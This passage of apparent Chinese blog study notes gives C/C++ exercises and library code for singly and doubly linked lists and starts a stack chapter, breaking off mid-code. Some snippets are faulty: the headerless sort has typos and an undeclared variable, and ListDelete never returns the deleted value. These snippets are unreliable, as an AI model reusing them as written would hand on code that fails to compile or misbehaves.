<p>解：在单链表中删除一个结点先要找到它的前驱结点，用指针p扫描整个单链表，pre指向结点的前驱结点，在扫描时用maxp指向data域值最大的结点，maxpre指向maxp所指结点的前驱结点。当单链表扫描完毕后，通过maxpre所指结点删除其后的结点，即删除了结点值最大的结点。<br>算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*删除最大节点*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delmaxnode</span><span class="params">(LinkNode *&amp;L)</span> </span>&#123;</span><br><span class="line">	LinkNode* p = L-&gt;next, * pre = L, * maxp = p,*maxpre = pre;</span><br><span class="line">	<span class="keyword">while</span> (p!=<span class="literal">NULL</span>) &#123;<span class="comment">//用p扫描整个单链表，pre始终指向其前驱节点</span></span><br><span class="line">		<span class="keyword">if</span> (maxp-&gt;data&lt;p-&gt;data) &#123;<span class="comment">//若找到一个更大的节点</span></span><br><span class="line">			maxp = p;<span class="comment">//更新maxp;</span></span><br><span class="line">			maxpre = pre;<span class="comment">//更新maxpre</span></span><br><span class="line">		&#125;</span><br><span class="line">		pre = p;<span class="comment">//p,pre同步后移一个节点</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	maxpre-&gt;next = maxp-&gt;next;<span class="comment">//删除</span></span><br><span class="line">	<span class="built_in">free</span>(maxp);<span class="comment">//释放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-8-排序"><a href="#例题-2-8-排序" class="headerlink" title="例题 2.8 排序"></a>例题 2.8 排序</h3><p><img src="https://onedrive.live.com/embed?resid=1D77EFE2DBD1006F!186&authkey=!ABd3WEHC72yhC_M" alt="1587870523888.png"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(LinkNode *&amp;L)</span> </span>&#123;</span><br><span class="line">	LinkNode* p, * pre, * q;</span><br><span class="line">	p = L-&gt;next-&gt;next;<span class="comment">//p指向L的第二个数据节点</span></span><br><span class="line">	L-&gt;next-&gt;next = <span class="literal">NULL</span>;<span class="comment">//构造只含一个数据节点的有序单链表</span></span><br><span class="line">	<span class="keyword">while</span> (p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		q = p-&gt;next;<span class="comment">//q保存p节点后继结点的指针</span></span><br><span class="line">		pre = L;    <span class="comment">//从有序单链表开头进行比较，pre指向插入节点的前驱节点</span></span><br><span class="line">		<span class="keyword">while</span> (pre-&gt;next!=<span class="literal">NULL</span> &amp;&amp; pre-&gt;next-&gt;data&lt;p-&gt;data) &#123;</span><br><span class="line">			pre = pre-&gt;next;<span class="comment">//在有序单链表中找插入p所指节点的前驱节点（pre所指向）</span></span><br><span class="line">		&#125;</span><br><span class="line">		p-&gt;next = pre-&gt;next;<span class="comment">//在pre所指结点之后插入p所指节点</span></span><br><span class="line">		pre-&gt;next = p;</span><br><span class="line">		p = q;  <span class="comment">//扫描原单链表余下的节点</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-9-简单选择排序"><a href="#例题-2-9-简单选择排序" class="headerlink" title="例题 2.9 简单选择排序"></a>例题 2.9 简单选择排序</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkNode* <span class="title">getMin</span><span class="params">(LinkNode*&amp; L)</span> </span>&#123;</span><br><span class="line">	LinkNode* min = L, * head = L;</span><br><span class="line">	<span class="keyword">while</span> (head-&gt;next) &#123;</span><br><span class="line">		<span class="keyword">if</span> (min-&gt;data &gt; (head-&gt;next-&gt;data))</span><br><span class="line">			min = head-&gt;next;</span><br><span class="line">		head = head-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SortList</span><span class="params">(LinkNode*&amp; L)</span> </span>&#123;</span><br><span class="line">	LinkNode* j, * i = L-&gt;next;</span><br><span class="line">	<span class="type">int</span> temp;</span><br><span class="line">	<span class="keyword">for</span> (; i-&gt;next != <span class="literal">NULL</span>; i = i-&gt;next) &#123;</span><br><span class="line">		j = <span class="built_in">getMin</span>(i);</span><br><span class="line">		<span class="keyword">if</span> (i-&gt;data != j-&gt;data) &#123;</span><br><span class="line">			temp = i-&gt;data;</span><br><span class="line">			i-&gt;data = j-&gt;data;</span><br><span class="line">			j-&gt;data = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	LinkNode* linknode;</span><br><span class="line">	<span class="built_in">InitList</span>(linknode);</span><br><span class="line">	ElemType a[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span> &#125;;</span><br><span class="line">	<span class="built_in">CreateListR</span>(linknode, a, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;原链表:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">DispList</span>(linknode);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">SortList</span>(linknode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;排序后链表:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">DispList</span>(linknode);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-9-不带头结点"><a href="#例题-2-9-不带头结点" class="headerlink" title="例题 2.9 不带头结点"></a>例题 2.9 不带头结点</h3><p>版本 2：不带头结点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(linklist *L)</span></span>&#123;</span><br><span class="line">	 linkNode * p,*pre,*max,*maxpre;</span><br><span class="line">	 linlist *h=L;</span><br><span class="line">	 L=<span class="literal">NULL</span>;</span><br><span class="line">	 <span class="keyword">while</span>(h!=<span class="literal">NULL</span>)&#123;				<span class="comment">//持续扫描原链表</span></span><br><span class="line">	 	p=max=h;pre=maxpre=<span class="literal">NULL</span>;</span><br><span class="line">	    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">	    	<span class="keyword">if</span>(p-&gt;data&gt;max-&gt;data)&#123;  <span class="comment">//找到更大的，记忆它和它的前驱</span></span><br><span class="line">			   max=p;</span><br><span class="line">			   maxpre=pre;</span><br><span class="line">	     	&#125;</span><br><span class="line">			 pre=p;					<span class="comment">//继续寻找</span></span><br><span class="line">			 p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(s==h)					<span class="comment">//最大结点在原链表前段</span></span><br><span class="line">		   h=h-&gt;next;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		   maxpre-&gt;next=max-&gt;next;<span class="comment">//最大结点在原链表内</span></span><br><span class="line">		   max-&gt;next=L;<span class="comment">//头插</span></span><br><span class="line">		   L=max;</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-3-2-1-交换前后节点"><a href="#例题-2-3-2-1-交换前后节点" class="headerlink" title="例题 2.3.2.1 交换前后节点"></a>例题 2.3.2.1 交换前后节点</h3><p>题目描述：线性表中各结点的检索概率不等,则可用如下策略提高顺序检索的效率:</p>
<p>若找到指定的结点,将该结点和其前驱结点)交换,</p>
<p>使得经常被检索的结点尽量位于表的前端,</p>
<p>试设计一个算法在顺序结构和链式结构的线性表上实现上述策略的顺序检索算法。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkNode* <span class="title">LinkSearch</span><span class="params">(LinkNode* L, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (L == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	LinkNode* p=L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next!=<span class="literal">NULL</span> &amp;&amp; p-&gt;next-&gt;data!=e)</span><br><span class="line">	&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;next!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n查找成功\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (p!=L) &#123;</span><br><span class="line">			ElemType t = p-&gt;data;</span><br><span class="line">			p-&gt;data = p-&gt;next-&gt;data;</span><br><span class="line">			p-&gt;next-&gt;data = t;</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n查找失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-3-双链表"><a href="#2-3-3-双链表" class="headerlink" title="2.3.3 双链表"></a>2.3.3 双链表</h2><h3 id="算法库：-1"><a href="#算法库：-1" class="headerlink" title="算法库："></a>算法库：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">DNode</span>&#123;</span><br><span class="line">	ElemType data;<span class="comment">//元素</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">DNode</span>* prior;  <span class="comment">//前驱节点</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">DNode</span>* next;   <span class="comment">//后继节点</span></span><br><span class="line">&#125;DLinkNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*头插法*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateListF</span><span class="params">(DLinkNode*&amp;L,ElemType a[],<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	DLinkNode* s;</span><br><span class="line">	L = (DLinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(DLinkNode));</span><br><span class="line">	L-&gt;prior = L-&gt;next = <span class="literal">NULL</span>;<span class="comment">//前后指针域置为null</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++) &#123;<span class="comment">//循环建立数据节点s</span></span><br><span class="line">		s = (DLinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(DLinkNode));</span><br><span class="line">		s-&gt;data = a[i];<span class="comment">//数据存入</span></span><br><span class="line">		s-&gt;next = L-&gt;next;<span class="comment">//将节点s插入到原首节点之前、头节点之后</span></span><br><span class="line">		<span class="keyword">if</span> (L-&gt;next!=<span class="literal">NULL</span>) &#123;<span class="comment">//若L存在数据节点，修改L-&gt;next的前驱指针</span></span><br><span class="line">			L-&gt;next-&gt;prior = s;</span><br><span class="line">		&#125;</span><br><span class="line">		L-&gt;next = s;</span><br><span class="line">		s-&gt;prior = L;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*尾插法*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateListR</span><span class="params">(DLinkNode*&amp; L, ElemType a[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	DLinkNode* s,*r;</span><br><span class="line">	L = (DLinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(DLinkNode));<span class="comment">//创建头节点</span></span><br><span class="line">	r = L;<span class="comment">//r始终指向尾节点，初始是指向头节点</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;<span class="comment">//循环建立数据节点</span></span><br><span class="line">		s = (DLinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(DLinkNode));</span><br><span class="line">		s-&gt;data = a[i];<span class="comment">//存入</span></span><br><span class="line">		r-&gt;next = s;<span class="comment">//将节点s插入到节点r之后,r指向尾节点</span></span><br><span class="line">		s-&gt;prior = r;</span><br><span class="line">		r = s;<span class="comment">//尾巴后面插元素，然后尾巴移到后一个元素，保证r始终是尾巴</span></span><br><span class="line">	&#125;</span><br><span class="line">	r-&gt;next = <span class="literal">NULL</span>;<span class="comment">//为节点的next置为null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*在第i个位置插入元素e*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert</span><span class="params">(DLinkNode*&amp; L, <span class="type">int</span> i, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	DLinkNode* p = L, * s;  <span class="comment">//p指向头节点，j设置为0</span></span><br><span class="line">	<span class="keyword">if</span> (i &lt;= <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//i错误返回false</span></span><br><span class="line">	<span class="keyword">while</span> (j &lt; i - <span class="number">1</span> &amp;&amp; p != <span class="literal">NULL</span>) &#123;<span class="comment">//查找第i-1个节点</span></span><br><span class="line">		j++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)<span class="comment">//未找到第i-1个节点</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		s = (DLinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(DLinkNode));</span><br><span class="line">		s-&gt;data = e;</span><br><span class="line">		s-&gt;next = p-&gt;next;<span class="comment">//头插法，在p节点之后插入s</span></span><br><span class="line">		<span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>) <span class="comment">//若p节点存在后继节点，修改其前驱指针</span></span><br><span class="line">			p-&gt;next-&gt;prior = s;</span><br><span class="line">		s-&gt;prior = p;</span><br><span class="line">		p-&gt;next = s;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除双链表下标i的元素，并返回*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete</span><span class="params">(DLinkNode*&amp; L, <span class="type">int</span> i, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	DLinkNode* p = L, * q;</span><br><span class="line">	<span class="keyword">if</span> (i &lt;= <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; i - <span class="number">1</span> &amp;&amp; p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		j++;<span class="comment">//移动指针</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		q = p-&gt;next;</span><br><span class="line">		<span class="keyword">if</span> (q == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		e = q-&gt;data;</span><br><span class="line">		p-&gt;next = q-&gt;next;<span class="comment">//p-&gt;next=p-&gt;next-&gt;next;</span></span><br><span class="line">		<span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>)p-&gt;next-&gt;prior = p;</span><br><span class="line">		<span class="built_in">free</span>(q);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化线性表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitList</span><span class="params">(DLinkNode*&amp;L)</span> </span>&#123;</span><br><span class="line">	L = (DLinkNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(DLinkNode));</span><br><span class="line">	L-&gt;next = <span class="literal">NULL</span>;<span class="comment">//指向null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*销毁线性表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyList</span><span class="params">(DLinkNode*&amp;L)</span> </span>&#123;</span><br><span class="line">	DLinkNode* pre = L, * p = L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">free</span>(pre);<span class="comment">//销毁节点，从头结点开始</span></span><br><span class="line">		pre = p;</span><br><span class="line">		p = pre-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pre);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*判断是否是空*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListEmpty</span><span class="params">(DLinkNode*L)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> L-&gt;next == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*求长度*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ListLength</span><span class="params">(DLinkNode*L)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">	DLinkNode* p = L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		n++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印单链表*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispList</span><span class="params">(DLinkNode* L)</span> </span>&#123;</span><br><span class="line">	DLinkNode* p = L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p!= <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;data);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*求第i个位置的元素值*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GetElem</span><span class="params">(DLinkNode*L,<span class="type">int</span> i,ElemType &amp;e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">	DLinkNode* p = L;</span><br><span class="line">	<span class="keyword">if</span> (i &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span> (j &lt; i &amp;&amp; p != <span class="literal">NULL</span>) &#123;<span class="comment">//移动到位置i</span></span><br><span class="line">		j++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		e = p-&gt;data;<span class="comment">//得到</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*按元素值查找，得到下标*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateElem</span><span class="params">(DLinkNode*L,ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">	DLinkNode* p = L-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data!=e) &#123;<span class="comment">//移到对应元素值</span></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-9-逆序"><a href="#例题-2-9-逆序" class="headerlink" title="例题 2.9 逆序"></a>例题 2.9 逆序</h3><p>[例2.9]有一个带头结点的双链表L，设计一个算法将其所有元素逆置，即第1个元素变为最后一个元素，第2个元素变为倒数第2个元素……最后一个元素变为第1个元素。<br>解：先构造只有一个头结点的空双链表L（利用原来的头结点），用p扫描双链表的所有数据结点，采用头插法将所指结点插人到L中。<br>算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*双链表节点逆置算法*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reverse</span><span class="params">(DLinkNode *&amp;L)</span> </span>&#123;</span><br><span class="line">	DLinkNode* p = L-&gt;next, * q;<span class="comment">//p指向首节点</span></span><br><span class="line">	L-&gt;next = <span class="literal">NULL</span>;       <span class="comment">//构造只有头节点的双链表L</span></span><br><span class="line">	<span class="keyword">while</span> (p!=<span class="literal">NULL</span>) &#123;	<span class="comment">//扫描所有节点</span></span><br><span class="line">		q = p-&gt;next;   <span class="comment">//会修改p节点的next域，用q临时保存其后继节点</span></span><br><span class="line">		p-&gt;next = L-&gt;next;  <span class="comment">//头插法将p插入双链表中</span></span><br><span class="line">		<span class="keyword">if</span> (L-&gt;next != <span class="literal">NULL</span>)<span class="comment">//若L中存在数据节点</span></span><br><span class="line">			L-&gt;next-&gt;prior = p;<span class="comment">//修改原来首节点的前驱指针</span></span><br><span class="line">		L-&gt;next = p;<span class="comment">//将新节点作为首节点</span></span><br><span class="line">		p-&gt;prior = L;</span><br><span class="line">		p = q;<span class="comment">//让p中心指向其后继节点</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-2-10-排序"><a href="#例题-2-10-排序" class="headerlink" title="例题 2.10 排序"></a>例题 2.10 排序</h3><p>与 2.8 基本相同</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*排序*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(DLinkNode*&amp; L)</span> </span>&#123;</span><br><span class="line">	DLinkNode* p, * pre, * q;</span><br><span class="line">	p = L-&gt;next-&gt;next;<span class="comment">//p指向L的第二个数据节点</span></span><br><span class="line">	L-&gt;next-&gt;next = <span class="literal">NULL</span>;<span class="comment">//构造只含一个数据节点的有序双链表</span></span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		q = p-&gt;next;<span class="comment">//q保存p节点后继结点的指针</span></span><br><span class="line">		pre = L;    <span class="comment">//从有序双链表开头进行比较，pre指向插入节点的前驱节点</span></span><br><span class="line">		<span class="keyword">while</span> (pre-&gt;next != <span class="literal">NULL</span> &amp;&amp; pre-&gt;next-&gt;data &lt; p-&gt;data)</span><br><span class="line">			pre = pre-&gt;next;<span class="comment">//在有序双链表中找插入p所指节点的前驱节点（pre所指向）</span></span><br><span class="line">		p-&gt;next = pre-&gt;next;<span class="comment">//在pre所指结点之后插入p所指节点</span></span><br><span class="line">		<span class="keyword">if</span> (pre-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">			pre-&gt;next-&gt;prior = p;</span><br><span class="line">		pre-&gt;next = p;</span><br><span class="line">		p-&gt;prior = pre;</span><br><span class="line">		p = q;  <span class="comment">//扫描原双链表余下的节点</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-4-循环链表"><a href="#2-3-4-循环链表" class="headerlink" title="2.3.4 循环链表"></a>2.3.4 循环链表</h2><p>待续</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>03第三章、栈和队列</title>
    <url>/2021/05/15/03%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="第三章、栈和队列"><a href="#第三章、栈和队列" class="headerlink" title="第三章、栈和队列"></a>第三章、栈和队列</h1><h2 id="3-1-2-栈"><a href="#3-1-2-栈" class="headerlink" title="3.1.2 栈"></a>3.1.2 栈</h2><h3 id="算法库："><a href="#算法库：" class="headerlink" title="算法库："></a>算法库：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType data[MaxSize];  <span class="comment">//存放在栈中的数据元素</span></span><br><span class="line">	<span class="type">int</span> top;				 <span class="comment">//栈顶指针</span></span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack*&amp; s)</span> </span>&#123;</span><br><span class="line">	s = (SqStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqStack));  <span class="comment">//分配空间</span></span><br><span class="line">	s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*销毁*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack*&amp; s)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">free</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*获取长度*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack* s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span>(s-&gt;top + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*判空*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack* s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (s-&gt;top == <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*进栈*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Push</span><span class="params">(SqStack*&amp; s, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s-&gt;top == MaxSize - <span class="number">1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	s-&gt;top++;</span><br><span class="line">	s-&gt;data[s-&gt;top] = e;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*出栈*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Pop</span><span class="params">(SqStack*&amp; s, ElemType&amp; e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s-&gt;top == <span class="number">-1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	e = s-&gt;data[s-&gt;top];</span><br><span class="line">	s-&gt;top--;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*取栈顶元素*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetTop</span><span class="params">(SqStack*&amp; s, ElemType&amp; e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s-&gt;top == <span class="number">-1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	e = s-&gt;data[s-&gt;top];</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*展示*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispStack</span><span class="params">(SqStack* s)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = s-&gt;top; i &gt;= <span 